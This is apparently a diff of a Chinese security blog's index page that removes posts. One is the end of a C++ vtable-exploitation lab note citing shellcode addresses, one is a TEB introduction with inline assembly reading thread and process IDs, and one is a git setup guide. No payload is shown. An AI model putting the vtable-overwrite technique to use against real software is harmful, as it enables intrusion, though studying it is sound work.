-
-<p>C++虚函数利用原理图：<br><img src="/images/2017-07-01/vtable.jpg" alt="C++虚函数利用原理图"></p>
-<p>首先需要知道的是：</p>
-<ul>
-<li>idata: 明显是一个Imports函数的代码段，这里集中所有外部函数地址，代码中会先跳到该地址后再执行，PE文件加载器在开始会获取真实的函数地址来修补idata段中的函数地址。</li>
-<li>data: 这个段存放程序的全局数据、全局常量等。</li>
-<li>rdata: 名字上看就是资源数据段，程序用到什么资源数据都在这里，资源包括你自己封包的，也包括开发工具自动封包的。</li>
-</ul>
-<p>所以我们应该在data段中找到自己需要的实验的全局变量</p>
-<font color="#f00">局部变量在栈中</font>
-
-
-<p>得到shellcode起始地址：0x0042AE50<br>shellcode结束地址：0x0042AF00</p>
-<h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><p><img src="/images/2017-07-01/result1.jpg" alt="实验结果"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/30/TEB简介/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/06/30/TEB简介/" itemprop="url">TEB简介</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-30T21:16:57+08:00">
-                2017-06-30
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全技术/" itemprop="url" rel="index">
-                    <span itemprop="name">安全技术</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="TEB特点"><a href="#TEB特点" class="headerlink" title="TEB特点"></a>TEB特点</h3><ol>
-<li>一个进程可能同时有多个线程</li>
-<li>每个线程都有一个线程环境块TEB</li>
-<li>第一个TEB开始于0x7FFDE000</li>
-<li>之后新建的线程的TEB将紧随前边的TEB，之间相隔0x100字节，并向内存地址方向</li>
-<li>线程退出时，对应的TEB也被销毁，腾出的TEB空间被新建的线程重复使用。</li>
-</ol>
-<p>线程环境块的预测图：<br><img src="/images/2017-06-30/TEB_prediction.jpg" alt="线程环境块的预测图"></p>
-<h3 id="TEB结构"><a href="#TEB结构" class="headerlink" title="TEB结构"></a>TEB结构</h3><p>由于TEB才是初学，对里面的很多结构都不怎么了解，写这一节主要是为了贴一张图，方便以后补充！</p>
-<p><img src="/images/2017-06-30/TEB.jpg" alt="TEB"></p>
-<p>当然为了充实被本篇博客，笔者提供几个小程序：</p>
-<p><br></p>
-<font color="#0f0">从FS寄存器获取当前线程</font>
-
-<pre><code>
-int GetThreadId()
-{
-    int ithread = 0;
-    _asm{
-        xor esi , esi
-        mov eax, fs:[esi+18h]     
-        mov ecx, [eax+ 20h] 
-        mov eax, [eax+ 24h]
-        mov dword ptr[ithread], eax
-    }
-    return ithread;
-}
-
-</code></pre>
-
-<p><br></p>
-<font color="#0f0">从FS寄存器获取当前进程ID</font>
-
-<pre><code>
-int GetProcessId()
-{
-    int iProcess = 0;
-    _asm{
-        xor esi , esi
-        mov eax, fs:[esi+18h]
-        mov ecx, [eax+ 20h]
-        mov eax, [eax+ 24h]
-        mov dword ptr[iProcess ], ecx
-    }
-    return iProcess;
-}
-
-</code></pre>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/30/使用git在github上创建新工程/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/06/30/使用git在github上创建新工程/" itemprop="url">使用git在github上创建新工程</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-30T14:29:17+08:00">
-                2017-06-30
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/tool/" itemprop="url" rel="index">
-                    <span itemprop="name">tool</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>这段时间进经常会忘记如何在github上同步工程，于是又得查资料，查参考书，浪费了很长时间，因此有了感触，写几篇有关此类问题的篇章！</p>
-<font color="#f00">这是老手新手都十分容易犯的错误，就是在创建一个新github项目或者以本地已有项目为原型重新创建一个github项目时，容易创建一个空文件夹就直接关联远程仓库，这样做只会返回错误！！！所以，文件夹一定不能为空......</font>
-
-<h3 id="创建新工程需要的命令"><a href="#创建新工程需要的命令" class="headerlink" title="创建新工程需要的命令"></a>创建新工程需要的命令</h3><h4 id="完成本地项目与git的关联"><a href="#完成本地项目与git的关联" class="headerlink" title="完成本地项目与git的关联"></a>完成本地项目与git的关联</h4><pre><code>
-cd 工程目录
-git init    //初始化本地仓库，当前目录下会出现一个名为 .git 的目录
-git add .    //将所有文件添加到缓存区，告诉 Git 开始对这些文件进行跟踪
-git commit -am "Hello"    //提交文件到本地仓库
-
-</code></pre>
-
-<h4 id="完成远程项目的创建"><a href="#完成远程项目的创建" class="headerlink" title="完成远程项目的创建"></a>完成远程项目的创建</h4><p>在github上创建某个项目，然后可以拷贝处该项目的地址</p>
-<h4 id="关联远程仓库（github上创建的地址）"><a href="#关联远程仓库（github上创建的地址）" class="headerlink" title="关联远程仓库（github上创建的地址）"></a>关联远程仓库（github上创建的地址）</h4><pre><code>
-git remote add origin https://github.com/Introspelliam/Hello.git    //关联远程仓库
-
-</code></pre>
-
-<h4 id="push本地项目到远程仓库"><a href="#push本地项目到远程仓库" class="headerlink" title="push本地项目到远程仓库"></a>push本地项目到远程仓库</h4><pre><code>
-git push origin master     //push项目到master
-Username for 'https://github.com': //你的github账户名称
-
-</code></pre>
-
-
-<h3 id="github上提供的工程创建方法"><a href="#github上提供的工程创建方法" class="headerlink" title="github上提供的工程创建方法"></a>github上提供的工程创建方法</h3><p><b>…or create a new repository on the command line</b></p>
-<pre><code>echo &quot;# ctf-challenges&quot; &gt;&gt; README.md
-git init
-git add README.md
-git commit -m &quot;first commit&quot;
-git remote add origin https://github.com/Introspelliam/ctf-challenges.git
-git push -u origin master
-</code></pre><p><b>…or push an existing repository from the command line</b></p>
-<pre><code>git remote add origin https://github.com/Introspelliam/ctf-challenges.git
-git push -u origin master
-</code></pre>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/10/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><span class="page-number current">11</span><a class="page-number" href="/page/12/">12</a><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/12/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/page/10/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><span class="page-number current">11</span><a class="page-number" href="/page/12/">12</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/12/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -3148,7 +3909,7 @@ git push -u origin master
             
               <a href="/archives/">
             
-                <span class="site-state-item-count">129</span>
+                <span class="site-state-item-count">132</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -3159,7 +3920,7 @@ git push -u origin master
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-count">16</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -3170,7 +3931,7 @@ git push -u origin master
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">54</span>
+                <span class="site-state-item-count">55</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -3395,6 +4156,8 @@ git push -u origin master
 
 
   
+
+
 
 
 
